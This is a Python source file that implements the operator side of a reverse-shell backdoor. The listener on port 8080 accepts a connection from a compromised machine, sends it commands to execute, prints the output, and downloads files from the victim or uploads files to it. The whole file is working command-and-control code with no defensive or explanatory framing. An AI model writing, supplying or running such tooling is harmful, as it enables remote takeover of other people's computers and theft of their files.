import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # bind socket to listen connections from any address on port 8080
        listener.bind((ip, port))
        # 0 is the amound of connections that can go into queue after the first connection
        listener.listen(0)
        print("Waiting for incoming connections...")
        self.connection, inc_address = listener.accept()  # accept the connection
        print(f"{str(inc_address)} has established the connection with you.")
        self.command = " "

    def listen(self):
        content = bytearray()
        while True:
            try:
                content.extend(self.connection.recv(1024))
                json_content = content.decode(encoding="utf-8")
                b64_string_content = json.loads(json_content)

                # if file downloading is finished, or it is finished the download and less than 1024 bytes,
                # or it is an error message, or it is the result of the command
                b64_bytes_content = b64_string_content.encode(encoding="utf-8")
                bytes_content = base64.b64decode(b64_bytes_content)

                # check for errors
                if bytes_content == b"Download error." or bytes_content == b"Error in executing command.":
                    return bytes_content.decode(encoding='utf-8')
                if self.command[0] == "download":
                    # save file
                    return self.save_file(self.command[1].split(
                        "\\")[-1], bytes_content)
                else:
                    # return the result of the command
                    return bytes_content.decode(encoding='utf-8')

            except ValueError:
                # keep downloading content
                continue

    def send_b64(self, content):
        b64_string = content.decode(encoding='utf-8')
        content = json.dumps(b64_string)
        self.connection.send(content.encode(encoding='utf-8'))

    def send_command(self):
        res = None
        if self.command[0] == "upload":
            if len(self.command) == 2:
                content = self.read_file(self.command[1])
                if content is False:
                    return False
                else:
                    res = True
            else:
                return False
        # if upload is valid or it is the other command
        json_com = json.dumps(self.command)
        self.connection.send(json_com.encode(encoding="utf-8"))

        if self.command[0] == "quit" and len(self.command) == 1:
            self.connection.close()
            quit()

        return res

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except Exception:
            return False

    def save_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(content)
                return "Successful download."
        except Exception:
            return "Error in saving file."

    def start(self):
        while True:
            try:
                self.command = input(">> ")
                self.command = self.command.split(" ")
                result = self.send_command()
                if result is False:  # if invalid upload, ask for new command
                    print("Upload error.")
                    continue
                elif result is True:  # if valid upload, send file
                    self.send_b64(self.read_file(self.command[1]))

                data = self.listen()
                print(data)
            except KeyboardInterrupt:
                print("\nClosing connection.")
                self.connection.close()
                quit()


my_listener = Listener("0.0.0.0", 8080)
my_listener.start()
